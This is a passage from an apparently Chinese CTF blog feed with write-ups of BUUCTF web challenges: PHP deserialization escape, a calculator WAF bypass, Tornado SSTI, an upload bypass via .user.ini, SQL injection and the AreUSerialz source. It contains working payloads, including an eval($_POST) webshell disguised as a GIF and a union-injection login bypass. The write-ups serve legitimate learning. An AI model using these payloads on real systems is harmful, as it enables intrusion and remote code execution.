class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271445397.png" alt="QQ截图20220227144500"></p><p>记住这一点很关键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是利用到上面将的：<strong>PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾（字符串除外），并且是根据长度判断内容的</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>这里进入phpinfo看看。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456509.png" alt="QQ截图20220227144911"></p><p>构造：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456115.png"></p><p>&#x2F;d0g3_fllllllag（将其base64）注意要加上<code>/</code>,弄了我半天。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mbGxsbGxsYWc=&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456746.png" alt="QQ截图20220227145447"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2022/02/27/BUUCTF/"/>
    <url>/2022/02/27/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><p>有点乱，之前在等博客开通。</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>配置了好久的图床，之前用hexo+github的服务器搭建博客。现在重新用vps搭建博客，是真的麻烦，还要申请备案啥的。<br>给自己取了一个好听的id名—-Xsw6_a，但是很难受，因为很多时候下划线(_)，是非法字符。<br>先来做做这个比较简单的题嘿嘿。<br>emmm又要重新启动一下环境。<br>先来看看源代码。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209579.png" alt="QQ截图20220214131745"></p><p>值得注意的几点。<br><strong>1.I’ve set up WAF to ensure security.</strong></p><p><strong>2.calc.php</strong></p><p>进入链接：<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a></p><p>读取代码：<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214132112.png" alt="QQ截图20220214132112"></p><p>这里对我来说的新知识，了解一下foreach函数。（菜鸟教程）<br>正则过滤了一些字符。<br>构造num&#x3D;print_r(scandir(chr(47))),发现报错。<br>emmm….不会了。百度。<br>只需要将num之前打一个空格。<br>新链接：<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(scandir(chr(47)))<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209866.png" alt="QQ截图20220214133023"></p><p>读取f1agg。<br>这里附上字符串转ascii的java代码，就当复习java基础语法了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/f1agg&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length();i++)&#123;<br>            <span class="hljs-type">int</span> temp=(<span class="hljs-type">int</span>)a.charAt(i);<br>            <span class="hljs-comment">//得到当前字符的ascii</span><br>            System.out.println(temp);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>完整链接：<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<br>得到flag。</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>随便点点发现url中<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed</a><br>filehash的值，emmm第一眼就觉得是加密。<br>接着发现<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209280.png" alt="QQ截图20220214134238"></p><p>直接上加密。<br>但是找了一圈没有找到cookie。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209059.png" alt="QQ截图20220214134456"></p><p>回头又想到render。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209239.png" alt="QQ截图20220214135041"></p><p>没有思路，就又查找wp了。<br>很奇妙，竟然联系到题目。跟着wp提示做一下。<br>一路跟到底…emmm<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209238.png" alt="QQ截图20220214140206"></p><p><strong>总结：handler 指向RequestHandler</strong></p><p><strong>而RequestHandler.settings又指向self.application.settings</strong></p><p><strong>所有handler.settings就指向RequestHandler.application.settings了！</strong></p><p>这里如果直接访问，会出现500的错误。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214140724.png" alt="QQ截图20220214140724"></p><p>所以这里就体现出了，为什么要间接访问。<br>然后自己调试的一些问题：这里好像链接构造成：0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81&#x2F;error?msg&#x3D;</p><p>msg后面输入什么，页面就会返回什么。跟作者说的ssti我觉得有问题。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209416.png" alt="QQ截图20220214141140"></p><p>这里如果是计算表达式就是不行。但是这里确实是符合ssti，emmm不理解。</p><p>管他呢，继续做叭。<br>构造链接：<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=</a></p><p>得到cookie，然后就去写代码咯。自己对着敲一遍。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-comment">#创建MD5加密对象</span><br><span class="hljs-built_in">hash</span>.update(<span class="hljs-string">&quot;/fllllllllllllag&quot;</span>.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><span class="hljs-comment">#更新对象要加密的字符串，要先UTF-8编码成二进制，因为md5只加密二进制</span><br>s1=<span class="hljs-built_in">hash</span>.hexdigest()<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-built_in">hash</span>.update((<span class="hljs-string">&quot;20d70faf-6981-4604-ba00-9f57cb0c2569&quot;</span>+s1).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>.hexdigest())<br></code></pre></td></tr></table></figure><p>就是注释md5加密又学到知识了。</p><p>最终链接:<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674</a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、如果url中参数屏蔽了字母，可在参数前+一个小空格。</p><p>2、scandir、print_f、file_get_contents等函数</p><p>3、看到render参数可联系到模板，联系到ssti，Tornado提供别名快速访问对象。</p><p>4、RequestHandler.application.settings目前不知道具体作用，中文翻译一下  请求处理程序 .申请.设置 估摸这就是查看cookie？</p><p>当然这里直接通过 handler.settings。</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>打开题目是上传文件。有源码先看源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>// error_reporting(0);<br>$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);<br>if (!file_exists($userdir)) &#123;<br>    mkdir($userdir, 0777, true);<br>&#125;<br>file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);<br>if (isset($_POST[&quot;upload&quot;])) &#123;<br>    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];<br>    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];<br>    if (!$tmp_name) &#123;<br>        die(&quot;filesize too big!&quot;);<br>    &#125;<br>    if (!$name) &#123;<br>        die(&quot;filename cannot be empty!&quot;);<br>    &#125;<br>    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);<br>    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;<br>        die(&quot;illegal suffix!&quot;);<br>    &#125;<br>    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;<br>        die(&quot;&amp;lt;? in contents!&quot;);<br>    &#125;<br>    $image_type = exif_imagetype($tmp_name);<br>    if (!$image_type) &#123;<br>        die(&quot;exif_imagetype:not image!&quot;);<br>    &#125;<br>    $upload_file_path = $userdir . &quot;/&quot; . $name;<br>    move_uploaded_file($tmp_name, $upload_file_path);<br>    echo &quot;Your dir &quot; . $userdir. &#x27; &lt;br&gt;&#x27;;<br>    echo &#x27;Your files : &lt;br&gt;&#x27;;<br>    var_dump(scandir($userdir));<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209537.png" alt="QQ截图20220222210628"></p><p>过滤了 <strong>&lt;?</strong><br>然后可以上传图像类型的文件。<br>这里就让我想到了上传.htacess，但是文章中也是过滤掉了。<br>(这里就走头无路了，看看wp，提示到apache是可以用.htacess，而这里用的服务器niginx)</p><p>优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx&#x2F;apache&#x2F;IIS都有效，而<code>.htaccess</code>只适用于apache</p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209473.png" alt="QQ截图20220222211627"></p><p>也就是说我们可以在<code>.user.ini</code>中设置<code>php.ini</code>中<strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置，而且只要是在使用 <strong>CGI／FastCGI</strong> 模式的服务器上都可以使用<code>.user.ini</code></p><p>在p牛的文章中提到了两个有趣的设置：<strong>auto_prepend_file</strong>和<strong>auto_append_file</strong></p><p>我们再到手册中看了下这两个设置的定义：</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210762.png" alt="QQ截图20220222212237"></p><p>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code>（这里就是为什么要写入跟上传文件的图片一个命名的原因。）</p><p>这两个设置的区别只是在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）。</p><h3 id="解题步骤（方法一）"><a href="#解题步骤（方法一）" class="headerlink" title="解题步骤（方法一）"></a>解题步骤（方法一）</h3><p>1、上传.user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></table></figure><p>2、上传a.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3、访问上传的文件路径。<strong>upload&#x2F;md5(*)</strong><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209510.png" alt="QQ截图20220222212917"></p><p>得到flag。</p><h3 id="绕过exif-imagetype-的奇技淫巧（解题方法二）"><a href="#绕过exif-imagetype-的奇技淫巧（解题方法二）" class="headerlink" title="绕过exif_imagetype()的奇技淫巧（解题方法二）"></a>绕过<code>exif_imagetype()</code>的奇技淫巧（解题方法二）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 10</span><br></code></pre></td></tr></table></figure><p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br> 在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br> XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br> 也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：<br> <code>#define test_width 16</code><br> <code>#define test_height 7</code></p><p>只需将上述文件中的GIF89a改为 </p><p>#define width 20</p><p>#define height 10</p><p>即可。</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>尝试很多次都是失败。然后突然发现。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210065.png" alt="QQ截图20220223162344"></p><p>这是一个什么编码呢？尝试许久不知道。查了查wp。是base32。然后是base64。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure><p>但是还是没有思路。因为根本绕不过。肯定还有别的校验。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;<br>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; <br>&lt;title&gt;Do you know who am I?&lt;/title&gt;<br>&lt;?php<br>require &quot;config.php&quot;;<br>require &quot;flag.php&quot;;<br><br>// 去除转义<br>if (get_magic_quotes_gpc()) &#123;<br>function stripslashes_deep($value)<br>&#123;<br>$value = is_array($value) ?<br>array_map(&#x27;stripslashes_deep&#x27;, $value) :<br>stripslashes($value);<br>return $value;<br>&#125;<br><br>$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);<br>$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);<br>$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);<br>$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);<br>&#125;<br><br>mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);<br>$name = $_POST[&#x27;name&#x27;];<br>$password = $_POST[&#x27;pw&#x27;];<br>$t_pw = md5($password);<br>$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;<br>// echo $sql;<br>$result = mysqli_query($con, $sql);<br><br><br>if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;<br>die(&quot;do not hack me!&quot;);<br>&#125;<br>else&#123;<br>if (!$result) &#123;<br>printf(&quot;Error: %s\n&quot;, mysqli_error($con));<br>exit();<br>&#125;<br>else&#123;<br>// echo &#x27;&lt;pre&gt;&#x27;;<br>$arr = mysqli_fetch_row($result);<br>// print_r($arr);<br>if($arr[1] == &quot;admin&quot;)&#123;<br>if(md5($password) == $arr[2])&#123;<br>echo $flag;<br>&#125;<br>else&#123;<br>die(&quot;wrong pass!&quot;);<br>&#125;<br>&#125;<br>else&#123;<br>die(&quot;wrong user!&quot;);<br>&#125;<br>&#125;<br>&#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>1、在name中过滤了一些字符以及or。</p><p>2、mysqli_query（）对数据库进行一次查询</p><p>3、mysqli_fetch_row() 函数从结果集中取得一行，并作为枚举数组返回。<br>4、md5加密后要与数组arr[2]弱类型比较。</p><p>5、值得注意的一点<code>$result = mysqli_query($con, $sql);</code>这里必须是有一个sql的查询语句，不然会直接退出（由下方判断得出）。</p><p>6、这里不是很能理解sql语句<code>$sql = &quot;select * from user where username = &#39;&quot;.$name.&quot;&#39;&quot;;</code>,拼接进去到底是什么样子的。询问了h3师傅。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210618.png" alt="QQ截图20220223170735"></p><p><strong><code>大爱h3</code></strong></p><p>尴尬，被教训了。我自己动手，设置的变量没有加<code>&quot;&quot;</code>,被骂的妥妥的，错了错了下次一定还敢哈哈哈哈。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210160.png" alt="QQ截图20220223171831"></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>1、<code>name=ad&#39; union select 1,&#39;admin&#39;,NULL#&amp;pw[]=123</code></p><p>2、<code>name=ad&#39; union select 1,&#39;admin&#39;,&#39;加密后的md5&#39;#&amp;pw[]=任意待MD5加密的密码</code>（本人没有复现成功，没有具体的数据库也不能跟进查看）。</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"> &lt;?php<br><br>include(&quot;flag.php&quot;);<br><br>highlight_file(__FILE__);<br><br>class FileHandler &#123;<br><br>    protected $op;<br>    protected $filename;<br>    protected $content;<br><br>    function __construct() &#123;<br>        $op = &quot;1&quot;;<br>        $filename = &quot;/tmp/tmpfile&quot;;<br>        $content = &quot;Hello World!&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>    public function process() &#123;<br>        if($this-&gt;op == &quot;1&quot;) &#123;<br>            $this-&gt;write();<br>        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;<br>            $res = $this-&gt;read();<br>            $this-&gt;output($res);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Bad Hacker!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function write() &#123;<br>        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;<br>            if(strlen((string)$this-&gt;content) &gt; 100) &#123;<br>                $this-&gt;output(&quot;Too long!&quot;);<br>                die();<br>            &#125;<br>            $res = file_put_contents($this-&gt;filename, $this-&gt;content);<br>            if($res) $this-&gt;output(&quot;Successful!&quot;);<br>            else $this-&gt;output(&quot;Failed!&quot;);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Failed!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function read() &#123;<br>        $res = &quot;&quot;;<br>        if(isset($this-&gt;filename)) &#123;<br>            $res = file_get_contents($this-&gt;filename);<br>        &#125;<br>        return $res;<br>    &#125;<br><br>    private function output($s) &#123;<br>        echo &quot;[Result]: &lt;br&gt;&quot;;<br>        echo $s;<br>    &#125;<br><br>    function __destruct() &#123;<br>        if($this-&gt;op === &quot;2&quot;)<br>            $this-&gt;op = &quot;1&quot;;<br>        $this-&gt;content = &quot;&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>&#125;<br><br>function is_valid($s) &#123;<br>    for($i = 0; $i &lt; strlen($s); $i++)<br>        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))<br>            return false;<br>    return true;<br>&#125;<br><br>if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;<br><br>    $str = (string)$_GET[&#x27;str&#x27;];<br>    if(is_valid($str)) &#123;<br>        $obj = unserialize($str);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="分析代码"><a href="#分析代码" class="headerlink" 